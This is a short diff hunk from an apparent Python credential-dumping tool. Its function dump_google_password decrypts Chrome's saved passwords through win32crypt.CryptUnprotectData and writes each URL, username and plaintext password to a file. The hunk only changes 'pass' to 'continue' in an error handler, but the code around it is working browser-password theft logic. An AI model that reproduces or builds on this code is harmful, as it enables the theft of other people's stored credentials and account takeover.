@@ -105,7 +105,7 @@ def dump_google_password():
             try:
                 password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
             except Exception:
-                pass
+                continue
             if password:
                 try:
                     passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
